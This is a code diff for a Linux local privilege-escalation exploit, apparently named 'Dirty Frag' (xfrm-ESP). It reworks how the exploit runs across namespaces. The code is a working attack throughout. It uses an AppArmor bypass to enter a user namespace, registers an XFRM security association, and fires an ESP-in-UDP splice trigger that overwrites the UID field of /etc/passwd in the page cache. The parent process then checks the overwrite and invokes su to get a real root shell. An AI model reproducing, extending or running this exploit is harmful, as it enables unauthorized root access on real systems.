@@ -510,13 +510,82 @@ static int run_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
 }
 #endif
 
+/* ---------------------------------------------------------------- *
+ * INNER — runs in the AA bypass userns (post-stage 2).
+ *
+ * No user interaction, no fork, no verify, no su. Just the kernel
+ * work: open netlink, register SA, fire splice trigger, exit.
+ * The parent (init ns) owns everything else.
+ * ---------------------------------------------------------------- */
+
+df_result_t dirtyfrag_esp_exploit_inner(void)
+{
+#ifdef __linux__
+    const char *user = getenv("DIRTYFAIL_TARGET_USER");
+    if (!user || !*user) {
+        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
+        return DF_TEST_ERROR;
+    }
+
+    off_t  uid_off; size_t uid_len; char uid_str[16];
+    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
+        log_bad("inner: find_passwd_uid_field('%s') failed", user);
+        return DF_TEST_ERROR;
+    }
+    if (uid_len != 4) {
+        log_bad("inner: UID '%s' is %zu chars; need 4", uid_str, uid_len);
+        return DF_TEST_ERROR;
+    }
+
+    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (nl < 0) {
+        log_bad("inner: AF_NETLINK XFRM: %s", strerror(errno));
+        return DF_EXPLOIT_FAIL;
+    }
+    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+        log_bad("inner: bind netlink: %s", strerror(errno));
+        close(nl);
+        return DF_EXPLOIT_FAIL;
+    }
+
+    if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
+        close(nl);
+        return DF_EXPLOIT_FAIL;
+    }
+    log_ok("inner: XFRM SA registered with seq_hi='%s'", MARKER);
+
+    if (!trigger_store(uid_off)) {
+        close(nl);
+        return DF_EXPLOIT_FAIL;
+    }
+    log_ok("inner: ESP-in-UDP trigger fired at uid_off=%lld",
+           (long long)uid_off);
+
+    close(nl);
+    return DF_EXPLOIT_OK;
+#else
+    log_bad("dirtyfrag_esp_exploit_inner: Linux-only");
+    return DF_TEST_ERROR;
+#endif
+}
+
+/* ---------------------------------------------------------------- *
+ * OUTER — runs in init namespace.
+ *
+ * Prompts the operator, sets env vars, fork → child arms AA bypass
+ * and runs the inner. Parent stays in init ns, waits, reads the
+ * global page cache to verify, then either:
+ *   - do_shell=true: execlp("su", user) — runs in init ns →
+ *     PAM reads modified /etc/passwd → uid 0 → real init-ns root
+ *   - do_shell=false: try_revert_passwd_page_cache, return.
+ * ---------------------------------------------------------------- */
+
 df_result_t dirtyfrag_esp_exploit(bool do_shell)
 {
     log_step("Dirty Frag (xfrm-ESP) — exploit");
 
-    /* After the AA bypass we may already be uid 0 inside a userns —
-     * use the outer uid for the /etc/passwd target lookup. */
-    uid_t uid = real_uid_for_target();
+    uid_t uid = getuid();
     if (uid == 0) {
         log_warn("already root in init namespace — nothing to escalate");
         return DF_OK;
@@ -553,65 +622,24 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
         return DF_OK;
     }
 
-    /* Two paths:
+    /* Hand off to the inner via env vars + AA bypass fork.
      *
-     * (a) AA bypass already armed us into a userns with caps — we ARE
-     *     the namespace; just register SA + fire the trigger directly.
-     *     Forking a child to unshare again would NEST and waste a slot.
-     *
-     * (b) Normal path (no AA restriction, or running as real root):
-     *     fork → child unshares fresh user/net namespace → trigger →
-     *     exits. Parent stays in init namespace for the eventual su. */
-#ifdef __linux__
-    if (apparmor_bypass_was_armed()) {
-        log_step("AA bypass already armed — skipping inner fork+unshare");
-        /* The bypass already brought lo up; just open netlink and go. */
-        int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
-        if (nl < 0) {
-            log_bad("AF_NETLINK XFRM: %s", strerror(errno));
-            return DF_EXPLOIT_FAIL;
-        }
-        struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
-        if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
-            log_bad("bind netlink: %s", strerror(errno));
-            close(nl);
-            return DF_EXPLOIT_FAIL;
-        }
-        if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
-            close(nl);
-            return DF_EXPLOIT_FAIL;
-        }
-        log_ok("XFRM SA registered with seq_hi='%s'", MARKER);
-        if (!trigger_store(uid_off)) {
-            close(nl);
-            return DF_EXPLOIT_FAIL;
-        }
-        log_ok("ESP-in-UDP trigger fired");
-        close(nl);
-    } else {
-        pid_t child = fork();
-        if (child < 0) {
-            log_bad("fork: %s", strerror(errno));
-            return DF_EXPLOIT_FAIL;
-        }
-        if (child == 0) {
-            int crc = run_in_userns(uid_off, getuid(), getgid());
-            _exit(crc);
-        }
-        int wstat = 0;
-        waitpid(child, &wstat, 0);
-        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-            log_bad("child failed (exit %d)",
-                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-            return DF_EXPLOIT_FAIL;
-        }
-    }
-#else
-    log_bad("dirtyfrag_esp_exploit: Linux-only");
-    return DF_TEST_ERROR;
-#endif
+     * The child fork enters the bypass userns, runs
+     * dirtyfrag_esp_exploit_inner (dispatched from main() based on
+     * DIRTYFAIL_INNER_MODE), modifies the global page cache, exits.
+     * We (parent, init ns) read the result via the same global page
+     * cache and execlp(su) here in init ns for REAL root. */
+    setenv("DIRTYFAIL_INNER_MODE",   "esp", 1);
+    setenv("DIRTYFAIL_TARGET_USER",  user,  1);
 
-    /* Verify in the parent namespace's page cache. */
+    int rc = apparmor_bypass_fork_arm(0, NULL);  /* argc/argv unused for forked variant */
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner exploit failed (exit=%d)", rc);
+        return DF_EXPLOIT_FAIL;
+    }
+
+    /* Verify in init namespace — page cache is global, so we see the
+     * child's modification here. */
     int v = open("/etc/passwd", O_RDONLY);
     if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
     if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
@@ -620,9 +648,6 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
     close(v);
     if (memcmp(land, MARKER, 4) != 0) {
         log_bad("write did not land — page cache reads '%.4s'", land);
-        log_hint("the primitive may have run in the child namespace's page "
-                 "cache view rather than the host's. Check kernel version "
-                 "and whether the SA succeeded.");
         return DF_EXPLOIT_FAIL;
     }
     log_ok("page cache now reports %s with uid 0", user);
@@ -635,7 +660,7 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
         return DF_EXPLOIT_OK;
     }
 
-    log_ok("invoking 'su %s' — enter your own password to drop into a root shell", user);
+    log_ok("invoking 'su %s' in init namespace — enter your password for REAL root", user);
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
